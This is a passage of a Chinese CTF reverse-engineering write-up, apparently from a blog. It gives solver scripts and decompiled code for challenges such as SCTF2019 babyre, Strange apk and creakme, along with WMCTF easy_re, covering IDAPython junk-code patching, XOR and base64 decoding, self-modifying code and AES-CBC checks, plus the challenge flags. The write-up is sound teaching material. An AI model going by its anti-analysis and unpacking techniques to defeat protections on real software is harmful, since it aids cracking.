class="number">0x5A</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x52</span>, <span class="number">0x78</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x6C</span>, <span class="number">0x48</span>, <span class="number">0x5C</span>, <span class="number">0x76</span>, <span class="number">0x5A</span>, <span class="number">0x45</span>, <span class="number">0x3D</span>]</span><br><span class="line"></span><br><span class="line">old_table = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">new_table = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(old_table)):</span><br><span class="line">    new_table += <span class="built_in">bytes</span>([<span class="number">61</span> + i])</span><br><span class="line"><span class="built_in">print</span>(new_table)</span><br><span class="line">cipher = <span class="built_in">bytes</span>(data)</span><br><span class="line">cipher = cipher.translate(<span class="built_in">bytes</span>.maketrans(new_table, old_table))</span><br><span class="line">plain = base64.b64decode(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor_data = [<span class="number">16</span>,<span class="number">89</span>,<span class="number">156</span>,<span class="number">146</span>,<span class="number">6</span>,<span class="number">34</span>,<span class="number">207</span>,<span class="number">165</span>,<span class="number">114</span>,<span class="number">30</span>,<span class="number">69</span>,<span class="number">106</span>,<span class="number">6</span>,<span class="number">203</span>,<span class="number">8</span>,<span class="number">195</span>,<span class="number">228</span>,<span class="number">73</span>,<span class="number">90</span>,<span class="number">99</span>,<span class="number">12</span>,<span class="number">223</span>,<span class="number">246</span>,<span class="number">95</span>,<span class="number">8</span>,<span class="number">40</span>,<span class="number">189</span>,<span class="number">226</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">31</span>,<span class="number">110</span>,<span class="number">170</span>,<span class="number">90</span>,<span class="number">202</span>,<span class="number">236</span>,<span class="number">128</span>,<span class="number">175</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(plain, xor_data):</span><br><span class="line">    flag += <span class="built_in">bytes</span>([i ^ j])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="SCTF2019-babyre"><a href="#SCTF2019-babyre" class="headerlink" title="[SCTF2019]babyre"></a>[SCTF2019]babyre</h3><p>存在花指令，用idapython去花</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">bg = <span class="number">0x0000000000000798</span></span><br><span class="line">end = <span class="number">0X000000000000F66</span></span><br><span class="line">addr = bg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_nop</span>(<span class="params">begin, end</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(end&gt;begin):</span><br><span class="line">        patch_byte(begin, <span class="number">0x90</span>)</span><br><span class="line">        begin=begin+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> addr+get_item_size(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(addr&lt;end):</span><br><span class="line">    <span class="built_in">next</span> =next_instr(addr)</span><br><span class="line">    create_insn(<span class="built_in">next</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;j&#x27;</span> <span class="keyword">in</span> print_insn_mnem(addr) <span class="keyword">and</span> <span class="string">&#x27;j&#x27;</span> <span class="keyword">in</span> print_insn_mnem(<span class="built_in">next</span>) :</span><br><span class="line">        <span class="keyword">if</span> get_operand_value(addr, <span class="number">0</span>) == get_operand_value(<span class="built_in">next</span>, <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;jmp %08x&#x27;</span>%addr)</span><br><span class="line">            dest_addr = get_operand_value(addr, <span class="number">0</span>)</span><br><span class="line">            patch_nop(addr, dest_addr)</span><br><span class="line">            addr=dest_addr</span><br><span class="line">            create_insn(addr)</span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line">    create_insn(addr)</span><br></pre></td></tr></table></figure><p>存在三关，第一关为三维迷宫 5 * 5 *5</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211011151419248.png" alt="image-20211011151419248"></p><p>用python打出来手走一遍</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x73</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        maze = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            maze += <span class="built_in">chr</span>(data[i*<span class="number">25</span> + j*<span class="number">5</span>+k])</span><br><span class="line">        <span class="built_in">print</span>(maze)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;================&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># path = b&quot;ddwwxxssxaxwwaasasyywwdd&quot;</span></span><br></pre></td></tr></table></figure><p>第二关，一个编码函数，编码后等于<code>sctf_9102</code></p><p>实际上就是base64</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">plain = <span class="string">b&quot;sctf_9102&quot;</span></span><br><span class="line">cipher = base64.b64encode(plain)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br></pre></td></tr></table></figure><p>第三关，魔改SM4加密，对比数据丢进去就出了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fl4g_is_s0_ug1y!</span><br></pre></td></tr></table></figure><p>最终flag为: <code>ddwwxxssxaxwwaasasyywwdd-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)</code></p><h3 id="WMCTF2020-easy-re"><a href="#WMCTF2020-easy-re" class="headerlink" title="[WMCTF2020]easy_re"></a>[WMCTF2020]easy_re</h3><p>通过x64dbg动态调试，f9运行，f2下断点， 通过输出<code>please input the flag:</code>来定位。</p><p>最后将perl脚本导出</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211011213717623.png" alt="image-20211011213717623"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$flag = &quot;WMCTF&#123;I_WAnt_dynam1c_F1ag&#125;&quot;;</span><br><span class="line">print &quot;please input the flag:&quot;;</span><br><span class="line">$line = &lt;STDIN&gt;;</span><br><span class="line">chomp($line);</span><br><span class="line">if($line eq $flag)&#123;</span><br><span class="line">	print &quot;congratulation!&quot;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	print &quot;no,wrong&quot;</span><br><span class="line">&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="2019红帽杯-Snake"><a href="#2019红帽杯-Snake" class="headerlink" title="[2019红帽杯]Snake"></a>[2019红帽杯]Snake</h3><p><a href="https://lantern.cool/wp-games-2019redhat/">2019 红帽杯 | Lantern’s 小站</a></p><h3 id="SCTF2019-Strange-apk"><a href="#SCTF2019-Strange-apk" class="headerlink" title="[SCTF2019]Strange apk"></a>[SCTF2019]Strange apk</h3><p>jdax打开，程序会先对一个data文件进行异或操作，解压apk在 assets 文件夹下找到 data 文件</p><p>脚本还原</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">b&quot;syclover&quot;</span></span><br><span class="line">file_data = <span class="built_in">open</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">new_file = <span class="built_in">open</span>(<span class="string">&quot;./mydata&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">decode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">cout = <span class="number">0</span>  </span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> file_data:</span><br><span class="line">    decode += <span class="built_in">bytes</span>([d ^ key[cout % <span class="number">8</span>]])</span><br><span class="line">    cout += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./mydata&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decode)</span><br></pre></td></tr></table></figure><p>则可知该文件为apk文件， 丢进jadx</p><p>查看Manifest.xml可知activity为s和t函数</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211011215947029.png" alt="image-20211011215947029"></p><h4 id="s函数"><a href="#s函数" class="headerlink" title="s函数"></a>s函数</h4><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211011220127907.png" alt="image-20211011220127907"></p><p>而f.sctf为base64</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211011220159078.png" alt="image-20211011220159078"></p><p>解码可以得到前12位flag</p><h4 id="t函数"><a href="#t函数" class="headerlink" title="t函数"></a>t函数</h4><p>经过f.encode后等于<code>~8t808_8A8n848r808i8d8-8w808r8l8d8&#125;8</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211011220600055.png" alt="image-20211011220600055"></p><p>encode如上，直接将奇数位(从0开始)去掉即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">b&quot;c2N0ZntXM2xjMG1l&quot;</span></span><br><span class="line">plain = base64.b64decode(s)</span><br><span class="line"><span class="comment"># print(plain)</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">b&quot;~8t808_8A8n848r808i8d8-8w808r8l8d8&#125;8&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">    plain += <span class="built_in">bytes</span>([s[i]])</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><h3 id="SCTF2019-creakme"><a href="#SCTF2019-creakme" class="headerlink" title="[SCTF2019]creakme"></a>[SCTF2019]creakme</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HMODULE ModuleHandleW; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">bool</span> v12; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v13; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v15; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">void</span> *v17; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">void</span> *v18; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v19; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *Block[<span class="number">5</span>]; <span class="comment">// [esp+10h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v23; <span class="comment">// [esp+24h] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v24[<span class="number">5</span>]; <span class="comment">// [esp+28h] [ebp-58h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v25; <span class="comment">// [esp+3Ch] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">48</span>]; <span class="comment">// [esp+40h] [ebp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [esp+7Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  ModuleHandleW = GetModuleHandleW(<span class="number">0</span>);</span><br><span class="line">  SMC(ModuleHandleW);                           <span class="comment">// .SCTF 段进行SMC, 带一个反调试</span></span><br><span class="line">  call_sctf();                                  <span class="comment">// 调用SMC后的代码</span></span><br><span class="line">  v4 = sub_402870(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;welcome to 2019 sctf&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, sub_402AC0);</span><br><span class="line">  sub_402870(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;please input your ticket:&quot;</span>);</span><br><span class="line">  sub_402AF0(<span class="built_in">std</span>::<span class="built_in">cin</span>, flag);</span><br><span class="line">  v24[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">15</span>;</span><br><span class="line">  LOBYTE(v24[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  sub_401D30(v24, flag, <span class="built_in">strlen</span>(flag));</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  v5 = aes_cbc(Block, (<span class="keyword">int</span>)v24);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">  v7 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5[<span class="number">5</span>] &gt;= <span class="number">0x10</span>u )</span><br><span class="line">    v7 = (_DWORD *)*v5;</span><br><span class="line">  v8 = v5[<span class="number">4</span>];</span><br><span class="line">  v9 = aPvfqyc4ttc2uxr;</span><br><span class="line">  v10 = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt; v8 )</span><br><span class="line">    v10 = v6;</span><br><span class="line">  v12 = v10 &lt; <span class="number">4</span>;</span><br><span class="line">  v11 = v10 - <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="keyword">if</span> ( v11 == <span class="number">-4</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( *v7 == *(_DWORD *)v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v7;</span><br><span class="line">      v9 += <span class="number">4</span>;</span><br><span class="line">      v12 = v11 &lt; <span class="number">4</span>;</span><br><span class="line">      v11 -= <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = *(_BYTE *)v7 &lt; (<span class="keyword">unsigned</span> __int8)*v9;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)v7 != *v9</span><br><span class="line">    || v11 != <span class="number">-3</span></span><br><span class="line">    &amp;&amp; ((v13 = *((_BYTE *)v7 + <span class="number">1</span>), v12 = v13 &lt; (<span class="keyword">unsigned</span> __int8)v9[<span class="number">1</span>], v13 != v9[<span class="number">1</span>])</span><br><span class="line">     || v11 != <span class="number">-2</span></span><br><span class="line">     &amp;&amp; ((v14 = *((_BYTE *)v7 + <span class="number">2</span>), v12 = v14 &lt; (<span class="keyword">unsigned</span> __int8)v9[<span class="number">2</span>], v14 != v9[<span class="number">2</span>])</span><br><span class="line">      || v11 != <span class="number">-1</span> &amp;&amp; (v15 = *((_BYTE *)v7 + <span class="number">3</span>), v12 = v15 &lt; (<span class="keyword">unsigned</span> __int8)v9[<span class="number">3</span>], v15 != v9[<span class="number">3</span>]))) )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = v12 ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_17:</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">LABEL_18:</span><br><span class="line">  <span class="keyword">if</span> ( !v16 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= v8 )</span><br><span class="line">      v16 = v6 &lt; v8;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v16 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v23 &gt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = Block[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v23 + <span class="number">1</span> &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = (<span class="keyword">void</span> *)*((_DWORD *)Block[<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(Block[<span class="number">0</span>] - v17 - <span class="number">4</span>) &gt; <span class="number">0x1F</span> )</span><br><span class="line">        invalid_parameter_noinfo_noreturn();</span><br><span class="line">    &#125;</span><br><span class="line">    sub_402F05(v17);</span><br><span class="line">  &#125;</span><br><span class="line">  v27 = <span class="number">-1</span>;</span><br><span class="line">  Block[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">15</span>;</span><br><span class="line">  LOBYTE(Block[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v25 &gt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = v24[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v25 + <span class="number">1</span> &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = (<span class="keyword">void</span> *)*((_DWORD *)v24[<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v24[<span class="number">0</span>] - v18 - <span class="number">4</span>) &gt; <span class="number">0x1F</span> )</span><br><span class="line">        invalid_parameter_noinfo_noreturn();</span><br><span class="line">    &#125;</span><br><span class="line">    sub_402F05(v18);</span><br><span class="line">  &#125;</span><br><span class="line">  v19 = <span class="string">&quot;Have fun!&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 )</span><br><span class="line">    v19 = <span class="string">&quot;A forged ticket!!&quot;</span>;</span><br><span class="line">  v20 = sub_402870(<span class="built_in">std</span>::<span class="built_in">cout</span>, v19);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, sub_402AC0);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SMC后的代码主要是对对比字符串进行操作，操作如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_404000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr); ++i )</span><br><span class="line">    --aPvfqyc4ttc2uxr[i];</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">  <span class="keyword">if</span> ( (result &amp; <span class="number">0xFFFFFFFE</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = result - v1;</span><br><span class="line">      v4 = *(_BYTE *)(v3 + <span class="number">4231191</span>);</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">4231191</span>) = aPvfqyc4ttc2uxr[v1];</span><br><span class="line">      aPvfqyc4ttc2uxr[v1++] = v4;</span><br><span class="line">      result = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v1 &lt; result &gt;&gt; <span class="number">1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后得到<code>nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=</code></p><p>接着就是一个CBC模式的AES</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">aes_cbc</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// si</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> *v12; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v14; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> *v15; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v16; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v17; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp-10h] [ebp-4B8h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp-Ch] [ebp-4B4h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp-8h] [ebp-4B0h]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [esp-4h] [ebp-4ACh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v24; <span class="comment">// [esp+14h] [ebp-494h]</span></span><br><span class="line">  <span class="keyword">size_t</span> Size; <span class="comment">// [esp+18h] [ebp-490h]</span></span><br><span class="line">  <span class="keyword">size_t</span> Sizea; <span class="comment">// [esp+18h] [ebp-490h]</span></span><br><span class="line">  <span class="keyword">char</span> *Block; <span class="comment">// [esp+1Ch] [ebp-48Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v28; <span class="comment">// [esp+20h] [ebp-488h]</span></span><br><span class="line">  <span class="keyword">char</span> *v29; <span class="comment">// [esp+20h] [ebp-488h]</span></span><br><span class="line">  <span class="keyword">void</span> **v30; <span class="comment">// [esp+24h] [ebp-484h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v31; <span class="comment">// [esp+28h] [ebp-480h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [esp+3ECh] [ebp-BCh]</span></span><br><span class="line">  <span class="keyword">size_t</span> v33; <span class="comment">// [esp+3F0h] [ebp-B8h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [esp+3F4h] [ebp-B4h]</span></span><br><span class="line">  <span 